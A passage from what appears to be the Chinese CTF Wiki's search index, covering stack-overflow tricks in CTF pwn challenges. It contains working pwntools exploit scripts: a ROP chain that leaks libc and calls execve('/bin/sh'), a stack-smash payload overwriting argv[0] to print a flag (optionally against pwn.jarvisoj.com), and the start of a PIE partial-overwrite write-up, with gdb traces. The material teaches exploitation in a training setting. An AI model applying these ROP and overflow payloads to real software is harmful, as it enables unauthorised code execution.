\u4e0d\u8fc7\u7531\u4e8e\u5229\u7528\u8fc7\u7a0b\u4e2d\u6808\u7684\u7ed3\u6784\u4f1a\u53d1\u751f\u53d8\u5316, \u6240\u4ee5\u4e00\u4e9b\u5173\u952e\u7684\u504f\u79fb\u8fd8\u9700\u8981\u901a\u8fc7\u591a\u6b21\u8c03\u8bd5\u6765\u786e\u5b9a","title":"leak stack"},{"location":"pwn/stackoverflow/others/#exp","text":"from pwn import * context . binary = \"./over.over\" def DEBUG ( cmd ): raw_input ( \"DEBUG: \" ) gdb . attach ( io , cmd ) io = process ( \"./over.over\" ) elf = ELF ( \"./over.over\" ) libc = elf . libc io . sendafter ( \">\" , 'a' * 80 ) stack = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - 0x70 success ( \"stack -> {:#x}\" . format ( stack )) # DEBUG(\"b *0x4006B9\\nc\") io . sendafter ( \">\" , flat ([ '11111111' , 0x400793 , elf . got [ 'puts' ], elf . plt [ 'puts' ], 0x400676 , ( 80 - 40 ) * '1' , stack , 0x4006be ])) libc . address = u64 ( io . recvuntil ( \" \\x7f \" )[ - 6 : ] . ljust ( 8 , ' \\0 ' )) - libc . sym [ 'puts' ] success ( \"libc.address -> {:#x}\" . format ( libc . address )) pop_rdi_ret = 0x400793 ''' $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \"pop|ret\" 0x00000000000f5279 : pop rdx ; pop rsi ; ret ''' pop_rdx_pop_rsi_ret = libc . address + 0xf5279 payload = flat ([ '22222222' , pop_rdi_ret , next ( libc . search ( \"/bin/sh\" )), pop_rdx_pop_rsi_ret , p64 ( 0 ), p64 ( 0 ), libc . sym [ 'execve' ], ( 80 - 7 * 8 ) * '2' , stack - 0x30 , 0x4006be ]) io . sendafter ( \">\" , payload ) io . interactive () \u603b\u7684\u6765\u8bf4\u8fd9\u79cd\u65b9\u6cd5\u8ddf stack pivot \u5dee\u522b\u5e76\u4e0d\u662f\u5f88\u5927","title":"exp"},{"location":"pwn/stackoverflow/others/#_9","text":"http://www.xfocus.net/articles/200602/851.html http://phrack.org/issues/58/4.html","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"pwn/stackoverflow/others/#stack-smash","text":"","title":"Stack smash"},{"location":"pwn/stackoverflow/others/#_10","text":"\u5728\u7a0b\u5e8f\u52a0\u4e86canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684 buffer \u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800c stack smash \u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u542f\u52a8 canary \u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0 canary \u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c __stack_chk_fail \u51fd\u6570\u6765\u6253\u5370 argv[0] \u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b void __attribute__ (( noreturn )) __stack_chk_fail ( void ) { __fortify_fail ( \"stack smashing detected\" ); } void __attribute__ (( noreturn )) internal_function __fortify_fail ( const char * msg ) { /* The loop is added only to keep gcc happy. */ while ( 1 ) __libc_message ( 2 , \"*** %s ***: %s terminated \\n \" , msg , __libc_argv [ 0 ] ?: \"<unknown>\" ); } \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6 argv[0] \u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728 __fortify_fail \u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/others/#_11","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2015 \u5e74 32C3 CTF smashes \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728 jarvisoj \u4e0a\u6709\u590d\u73b0\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/others/#_12","text":"\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a 64 \u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4ee5\u53ca NX \u4fdd\u62a4\uff0c\u4ee5\u53ca FORTIFY \u4fdd\u62a4\u3002 \u279c stacksmashes git: ( master ) \u2717 checksec smashes Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/stackoverflow/others/#_13","text":"ida \u770b\u4e00\u4e0b __int64 sub_4007E0 () { __int64 v0 ; // rax@1 __int64 v1 ; // rbx@2 int v2 ; // eax@3 __int64 v4 ; // [sp+0h] [bp-128h]@1 __int64 v5 ; // [sp+108h] [bp-20h]@1 v5 = * MK_FP ( __FS__ , 40LL ); __printf_chk ( 1LL , ( __int64 ) \"Hello! \\n What's your name? \" ); LODWORD ( v0 ) = _IO_gets (( __int64 ) & v4 ); if ( ! v0 ) LABEL_9 : _exit ( 1 ); v1 = 0LL ; __printf_chk ( 1LL , ( __int64 ) \"Nice to meet you, %s. \\n Please overwrite the flag: \" ); while ( 1 ) { v2 = _IO_getc ( stdin ); if ( v2 == - 1 ) goto LABEL_9 ; if ( v2 == '\\n' ) break ; byte_600D20 [ v1 ++ ] = v2 ; if ( v1 == ' ' ) goto LABEL_8 ; } memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); LABEL_8 : puts ( \"Thank you, bye!\" ); return * MK_FP ( __FS__ , 40LL ) ^ v5 ; } \u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728 _IO_gets((__int64)&v4); \u5b58\u5728\u6808\u6ea2\u51fa\u3002 \u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981 overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728 while \u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5 memset (( void * )(( signed int ) v1 + 0x600D20LL ), 0 , ( unsigned int )( 32 - v1 )); \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002 .data:0000000000600D20 ; char aPctfHereSTheFl[] .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0 \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86 \u5728 ELF \u5185\u5b58\u6620\u5c04\u65f6\uff0cbss \u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528 gdb \u7684 find\u6765\u8fdb\u884c\u67e5\u627e\u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/stackoverflow/others/#flag","text":"\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7d memset \u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b gef \u27a4 c Continuing. Hello ! What ' s your name ? qqqqqqq Nice to meet you , qqqqqqq. Please overwrite the flag : 222222222 Breakpoint 1 , __memset_avx2 () at .. / sysdeps / x86_64 / multiarch / memset-avx2.S : 38 38 .. / sysdeps / x86_64 / multiarch / memset-avx2.S : \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55 . \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x7ffff7b7f920 < __memset_chk_avx2 + 0 > cmp rcx , rdx 0 x7ffff7b7f923 < __memset_chk_avx2 + 3 > jb 0x7ffff7b24110 < __GI___chk_fail > 0 x7ffff7b7f929 nop DWORD PTR [ rax + 0x0 ] \u2192 0 x7ffff7b7f930 < __memset_avx2 + 0 > vpxor xmm0 , xmm0 , xmm0 0 x7ffff7b7f934 < __memset_avx2 + 4 > vmovd xmm1 , esi 0 x7ffff7b7f938 < __memset_avx2 + 8 > lea rsi , [ rdi + rdx * 1 ] 0 x7ffff7b7f93c < __memset_avx2 + 12 > mov rax , rdi \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffda38 ' , ' l8 ' ] 8 0 x00007fffffffda38 \u2502+ 0x00 : 0x0000000000400878 \u2192 mov edi , 0x40094e \u2190 $rsp 0 x00007fffffffda40 \u2502+ 0x08 : 0x0071717171717171 ( \" qqqqqqq \"? ) 0 x00007fffffffda48 \u2502+ 0x10 : 0x0000000000000000 0 x00007fffffffda50 \u2502+ 0x18 : 0x0000000000000000 0 x00007fffffffda58 \u2502+ 0x20 : 0x0000000000000000 0 x00007fffffffda60 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffda68 \u2502+ 0x30 : 0x0000000000000000 0 x00007fffffffda70 \u2502+ 0x38 : 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2() [ #1] 0x400878 \u2192 mov edi, 0x40094e \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 find 22222 Argument required ( expression to compute ). gef \u27a4 find ' 22222 ' No symbol \" 22222 \" in current context. gef \u27a4 grep ' 22222 ' [+] Searching ' 22222 ' in memory [+] In '/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ' ( 0x600000 - 0x601000 ), permission = rw- 0 x600d20 - 0x600d3f \u2192 \" 222222222 ' s the flag on server }\" [ + ] In ' [ heap ] ' ( 0x601000 - 0x622000 ), permission = rw- 0 x601010 - 0x601019 \u2192 \" 222222222 \" gef \u27a4 grep PCTF [+] Searching ' PCTF ' in memory [+] In '/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ' ( 0x400000 - 0x401000 ), permission = r-x 0 x400d20 - 0x400d3f \u2192 \" PCTF { Here ' s the flag on server }\" \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u7684 2222 \u5df2\u7ecf\u8986\u76d6\u4e86 0x600d20 \u5904\u7684 flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u7684 0x400d20 \u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86 flag \u7684\u5730\u5740\u3002","title":"\u786e\u5b9a flag \u5730\u5740"},{"location":"pwn/stackoverflow/others/#_14","text":"\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9a argv[0] \u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002 \u9996\u5148\u4e0b\u65ad\u70b9\u5728 main \u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b gef \u27a4 b * 0x00000000004006D0 Breakpoint 1 at 0x4006d0 gef \u27a4 r Starting program : / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes Breakpoint 1 , 0x00000000004006d0 in ?? () code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x4006c0 < _IO_gets@plt + 0 > jmp QWORD PTR [ rip + 0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 < _IO_gets@plt + 6 > push 0x9 0 x4006cb < _IO_gets@plt + 11 > jmp 0x400620 \u2192 0 x4006d0 sub rsp , 0x8 0 x4006d4 mov rdi , QWORD PTR [ rip + 0x200665 ] # 0x600d40 <stdout> 0x4006db xor esi , esi 0 x4006dd call 0x400660 < setbuf@plt > \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffdb78 ' , ' l8 ' ] 8 0 x00007fffffffdb78 \u2502+ 0x00 : 0x00007ffff7a2d830 \u2192 < __libc_start_main + 240 > mov edi , eax \u2190 $rsp 0 x00007fffffffdb80 \u2502+ 0x08 : 0x0000000000000000 0 x00007fffffffdb88 \u2502+ 0x10 : 0x00007fffffffdc58 \u2192 0x00007fffffffe00b \u2192 \"/ mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / exam [...] \" 0 x00007fffffffdb90 \u2502+ 0x18 : 0x0000000100000000 0 x00007fffffffdb98 \u2502+ 0x20 : 0x00000000004006d0 \u2192 sub rsp , 0x8 0 x00007fffffffdba0 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffdba8 \u2502+ 0x30 : 0x48c916d3cf726fe3 0 x00007fffffffdbb0 \u2502+ 0x38 : 0x00000000004006ee \u2192 xor ebp , ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x4006d0 \u2192 sub rsp, 0x8 [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48) --- Type < return > to continue , or q < return > to quit--- [ #2] 0x400717 \u2192 hlt \u53ef\u4ee5\u770b\u51fa 0x00007fffffffe00b \u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662f argv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58 \u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f 0x00007fffffffdc58\u3002 \u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801 .text: 00000000004007 E0 push rbp .text: 00000000004007 E1 mov esi , offset aHelloWhatSYour ; \"Hello!\\nWhat's your name? \" .text : 00000000004007 E6 mov edi , 1 .text: 00000000004007 EB push rbx .text: 00000000004007 EC sub rsp , 118 h .text: 00000000004007 F3 mov rax , fs : 28 h .text: 00000000004007 FC mov [ rsp + 128 h + var_20 ], rax .text: 0000000000400804 xor eax , eax .text: 0000000000400806 call ___printf_chk .text: 000000000040080 B mov rdi , rsp .text: 000000000040080 E call __IO_gets \u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528 __IO_gets \u4e4b\u524d\u7684 rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728 call \u5904\uff0c\u5982\u4e0b gef \u27a4 b * 0x000000000040080E Breakpoint 2 at 0x40080e gef \u27a4 c Continuing. Hello ! What ' s your name ? Breakpoint 2 , 0x000000000040080e in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386: x86-64 ] \u2500\u2500\u2500\u2500 0 x400804 xor eax , eax 0 x400806 call 0x4006b0 < __printf_chk@plt > 0 x40080b mov rdi , rsp \u2192 0 x40080e call 0x4006c0 < _IO_gets@plt > \u21b3 0 x4006c0 < _IO_gets@plt + 0 > jmp QWORD PTR [ rip + 0x20062a ] # 0x600cf0 <_IO_gets@got.plt> 0x4006c6 < _IO_gets@plt + 6 > push 0x9 0 x4006cb < _IO_gets@plt + 11 > jmp 0x400620 0 x4006d0 sub rsp , 0x8 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 x7fffffffda40 ' , ' l8 ' ] 8 0 x00007fffffffda40 \u2502+ 0x00 : 0x0000ff0000000000 \u2190 $rsp , $rdi 0 x00007fffffffda48 \u2502+ 0x08 : 0x0000000000000000 0 x00007fffffffda50 \u2502+ 0x10 : 0x0000000000000000 0 x00007fffffffda58 \u2502+ 0x18 : 0x0000000000000000 0 x00007fffffffda60 \u2502+ 0x20 : 0x0000000000000000 0 x00007fffffffda68 \u2502+ 0x28 : 0x0000000000000000 0 x00007fffffffda70 \u2502+ 0x30 : 0x0000000000000000 0 x00007fffffffda78 \u2502+ 0x38 : 0x0000000000000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x40080e \u2192 call 0x4006c0 <_IO_gets@plt> \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 print $rsp $1 = ( void *) 0x7fffffffda40 \u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a >>> 0x00007fffffffdc58 - 0x7fffffffda40 536 >>> hex ( 536 ) '0x218'","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"pwn/stackoverflow/others/#_15","text":"\u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b from pwn import * context . log_level = 'debug' smash = ELF ( './smashes' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.jarvisoj.com' , 9877 ) else : sh = process ( './smashes' ) argv_addr = 0x00007fffffffdc58 name_addr = 0x7fffffffda40 flag_addr = 0x600D20 another_flag_addr = 0x400d20 payload = 'a' * ( argv_addr - name_addr ) + p64 ( another_flag_addr ) sh . recvuntil ( 'name? ' ) sh . sendline ( payload ) sh . recvuntil ( 'flag: ' ) sh . sendline ( 'bb' ) data = sh . recv () sh . interactive () \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86 flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230 flag \u7684\u60c5\u51b5\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"pwn/stackoverflow/others/#_16","text":"","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/others/#partial-overwrite","text":"partial overwrite \u8fd9\u79cd\u6280\u5de7\u5728\u5f88\u591a\u5730\u65b9\u90fd\u9002\u7528, \u8fd9\u91cc\u5148\u4ee5\u6808\u4e0a\u7684 partial overwrite \u4e3a\u4f8b\u6765\u4ecb\u7ecd\u8fd9\u79cd\u601d\u60f3 \u6211\u4eec\u77e5\u9053, \u5728\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u4fdd\u62a4\u65f6 (PIE enabled) \u9ad8\u4f4d\u7684\u5730\u5740\u4f1a\u53d1\u751f\u968f\u673a\u5316, \u4f46\u4f4e\u4f4d\u7684\u504f\u79fb\u662f\u59cb\u7ec8\u56fa\u5b9a\u7684, \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u80fd\u66f4\u6539\u4f4e\u4f4d\u7684\u504f\u79fb, \u5c31\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41, \u7ed5\u8fc7 PIE \u4fdd\u62a4","title":"\u6808\u4e0a\u7684 partial overwrite"},{"location":"pwn/stackoverflow/others/#_17","text":"\u4ee5\u5b89\u6052\u676f 2018 \u5e74 7 \u6708\u6708\u8d5b\u7684 babypie \u4e3a\u4f8b\u5206\u6790\u8fd9\u4e00\u79cd\u5229\u7528\u6280\u5de7, \u9898\u76ee\u7684 binary \u653e\u5728\u4e86 ctf-challenge \u4e2d","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/others/#_18","text":"babypie: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped [ * ] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6, \u5f00\u542f\u4e86 PIE \u4fdd\u62a4\u548c\u6808\u6ea2\u51fa\u4fdd\u62a4","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"pwn/stackoverflow/others/#_19","text":"IDA \u4e2d\u770b\u4e00\u4e0b, \u5f88\u5bb9\u6613\u5c31\u80fd\u53d1\u73b0\u6f0f\u6d1e\u70b9, \u4e24\u5904\u8f93\u5165\u90fd\u6709\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e, \u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u8f93\u5165\u4e4b\u524d, \u7a0b\u5e8f\u5bf9\u6808\u7a7a\u95f4\u8fdb\u884c\u4e86\u6e05\u96f6, \u8fd9\u6837\u6211\u4eec\u5c31\u65e0\u6cd5\u901a\u8fc7\u6253\u5370\u6808\u4e0a\u4fe1\u606f\u6765 leak binary \u6216\u8005 libc \u7684\u57fa\u5740\u4e86 __int64 sub_960 () { char buf [ 40 ]; // [rsp+0h] [rbp-30h] unsigned __int64 v2 ; // [rsp+28h] [rbp-8h] v2 = __readfsqword ( 0x28u ); setvbuf ( stdin , 0LL , 2 , 0LL ); setvbuf ( _bss_start , 0LL , 2 , 0LL ); * ( _OWORD * ) buf = 0uLL ; * ( _OWORD * ) & buf [ 16 ] = 0uLL ; puts ( \"Input your Name:\" ); read ( 0 , buf , 0x30uLL ); // overflow printf ( \"Hello %s: \\n \" , buf , * ( _QWORD * ) buf , * ( _QWORD * ) & buf [ 8 ], * ( _QWORD * ) & buf [ 16 ], * ( _QWORD * ) & buf [ 24 ]); read ( 0 , buf , 0x60uLL ); // overflow return 0LL ; } \u540c\u65f6\u4e5f\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u7ed9\u4e86\u80fd\u76f4\u63a5 get shell \u7684\u51fd\u6570 .text: 0000000000000 A3E getshell proc near .text: 0000000000000 A3E ; __unwind { .text:0000000000000A3E push rbp .text : 0000000000000 A3F mov rbp , rsp .text: 0000000000000 A42 lea rdi , command ; \"/bin/sh\" .text : 0000000000000 A49 call _system .text: 0000000000000 A4E nop .text: 0000000000000 A4F pop rbp .text: 0000000000000 A50 retn .text: 0000000000000 A50 ; } // starts at A3E .text : 0000000000000 A50 getshell endp \u8fd9\u6837\u6211\u4eec\u53ea\u8981\u63a7\u5236 rip \u5230\u8be5\u51fd\u6570\u5373\u53ef","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/stackoverflow/others/#leak-canary","text":"\u5728\u7b2c\u4e00\u6b21 read \u4e4b\u540e\u7d27\u63a5\u7740\u5c31\u6709\u4e00\u4e2a\u8f93\u51fa, \u800c read \u5e76\u4e0d\u4f1a\u7ed9\u8f93\u5165\u7684\u672b\u5c3e\u52a0\u4e0a \\0, \u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec leak \u6808\u4e0a\u5185\u5bb9\u7684\u673a\u4f1a, \u4e3a\u4e86\u7b2c\u4e8c\u6b21\u6ea2\u51fa\u80fd\u63a7\u5236\u8fd4\u56de\u5730\u5740, \u6211\u4eec\u9009\u62e9 leak canary. \u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b2c\u4e00\u6b21 read \u9700\u8981\u7684\u957f\u5ea6\u4e3a 0x30 - 0x8 + 1 (+ 1 \u662f\u4e3a\u4e86\u8986\u76d6 canary \u7684\u6700\u4f4e\u4f4d\u4e3a\u975e 0 \u7684\u503c, printf \u4f7f\u7528 %s \u65f6, \u9047\u5230 \\0 \u7ed3\u675f, \u8986\u76d6 canary 